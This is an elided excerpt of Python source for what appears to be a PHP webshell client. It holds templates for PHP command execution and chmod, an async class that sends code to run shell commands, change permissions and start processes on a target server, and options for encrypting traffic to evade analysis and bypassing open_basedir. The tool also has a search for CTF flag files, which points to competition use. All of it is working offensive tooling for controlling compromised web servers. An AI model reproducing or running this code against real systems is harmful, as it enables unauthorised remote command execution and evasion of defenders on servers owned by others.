...
if(function_exists("shell_exec")){
    ...
    $fp = popen($cmd, "r");
    while(!feof($fp)){$out .= fread($fp, 4096);}
    pclose($fp);
...
CHMOD_PHP = compress_phpcode_template(
    """
$filePath = {filepath};
$mode = {mode};
if(!file_exists($filePath)) {
    decoder_echo("WRONG_NOT_EXIST");
}else if(!is_writeable($filePath) && !is_writeable(dirname($filePath))) {
    decoder_echo("WRONG_NO_PERMISSION");
}else {
    $octMode = intval($mode, 8);
    $result = chmod($filePath, $octMode);
    if($result) {
        decoder_echo("SUCCESS");
    }else{
        decoder_echo("FAILED");
...
basic_info_names = {
    ...
    "CURRENT_PHP_SCRIPT": "Current PHP Script",
    "CURRENT_PHPINI": "php.ini Location",
    "HTTP_SOFTWARE": "HTTP Server",
    ...
    "CTF_FLAGS": "Possible CTF Flag Files",
}
...
php_webshell_action_options = [
    ...
    Option(
        ...
        type="text",
        placeholder="Max concurrent coroutines for upload/download",
        default_value="4",
        alternatives=None,
    ),
]
...
php_webshell_communication_options = [
    ...
    Option(
        ...
        name="Session Payload Cache",
        type="checkbox",
        placeholder="Cache payload in session to reduce payload size per request",
        default_value=False,
        alternatives=None,
    ),
    Option(
        ...
        name="Anti-Replay",
        type="checkbox",
        placeholder="Prevent replay attacks via server-generated random keys",
        default_value=False,
        alternatives=None,
    ),
    Option(
        ...
        type="checkbox",
        placeholder="Use RSA+AES256 encryption to prevent traffic analysis and replay attacks",
        default_value=False,
        alternatives=None,
    ),
    Option(
        id="bypass_open_basedir",
        name="Bypass open_basedir",
        type="checkbox",
        placeholder="Bypass open_basedir restrictions in php.ini",
        default_value=False,
        alternatives=None,
    ),
]
...
class PHPWebshellActions(PHPSessionInterface):
    ...
    async def execute_cmd(self, cmd: str) -> str:
        ...
        # 所以需要关闭session来避免阻塞
        no_func_marker = "NO_FUNC_" + uuid.uuid4().hex
        result = await self.submit(
            format_phpcode(
                EXECUTE_COMMAND_PHP,
                cmd=string_repr(cmd),
                no_func_marker=string_repr(no_func_marker),
            )
        )
        if result == no_func_marker:
            raise exceptions.TargetError(
                "目标无可用的命令执行函数(shell_exec/exec/system/passthru/popen/proc_open)"
            )
        return result
    ...
    async def chmod(self, filepath: str, mode: str) -> None:
        php_code = format_phpcode(
            CHMOD_PHP,
            filepath=string_repr(filepath),
            mode=string_repr(mode),
        )
        result = await self.submit(php_code)
        if result == "WRONG_NOT_EXIST":
            raise exceptions.FileError("目标不存在")
        if result == "WRONG_NO_PERMISSION":
            raise exceptions.FileError("没有权限修改该目标权限")
        if result == "FAILED":
            raise exceptions.FileError("修改权限失败")
        if result != "SUCCESS":
            raise exceptions.FileError("修改权限没有反馈成功")
    ...
    async def create_process(
        ...
        if client_code is None:
            client_code, _ = await start_vessel_server(self, server_session=server_session)
            if url:
